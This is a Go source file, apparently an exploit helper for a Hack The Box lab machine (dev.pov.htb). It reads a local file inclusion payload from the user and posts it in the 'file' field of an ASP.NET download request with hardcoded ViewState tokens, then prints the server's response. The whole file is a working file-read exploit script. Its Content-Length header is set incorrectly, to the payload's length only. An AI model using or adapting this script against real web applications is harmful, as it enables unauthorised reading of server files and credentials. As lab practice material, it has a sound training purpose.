package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
)

func main() {
	urlEndpoint := "http://dev.pov.htb/portfolio/"

	var payload string

	fmt.Print("Enter LFI payload: ")
	_, err := fmt.Scanln(&payload)
	if err != nil {
		fmt.Println("Error reading input:", err)
		return
	}

	fmt.Println("You entered:", payload)

	escapedPayload := url.QueryEscape(payload)

	//change the POST item in this request , if u want this thing to work
	req, err := http.NewRequest("POST", urlEndpoint, bytes.NewBufferString(fmt.Sprintf("__EVENTTARGET=download&__EVENTARGUMENT=&__VIEWSTATE=wSSKhVFqDyWdF5cuaU6N1qA0LbrW7yQoac9joZMIIRhfw5O5b4Bdj6zH9VvUb9nomtkSfNbhkG4QqD7m9JQbtIW3xZw%%3D&__VIEWSTATEGENERATOR=8E0F0FA3&__EVENTVALIDATION=AsG57gPekT2JC7pT%%2Bg%%2BoytzbZ2UeGkrM5PjyAHdvaLw%%2F9BOr1c04Egpfo0G%%2F%%2BAy4OyyJsggZMQhrSKYj2VXd6Yi64iC%%2BPd%%2FULONi0FFxZ0o4zBo4fbndIwLFySRKKN1CDMijBA%%3D%%3D&file=%s", escapedPayload)))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Host", "dev.pov.htb")
	req.Header.Set("Content-Length", fmt.Sprint(len(escapedPayload)))
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://dev.pov.htb")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Referer", "http://dev.pov.htb/portfolio/")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error making request:", err)
		return
	}
	defer resp.Body.Close()

	//fmt.Println("Status Code:", resp.Status)
	if resp.Status == "200 OK" {
		fmt.Println("Wow, it's working!")

		// Read the response body
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return
		}

		fmt.Println("Response Body:", string(body))
		return
	}
}
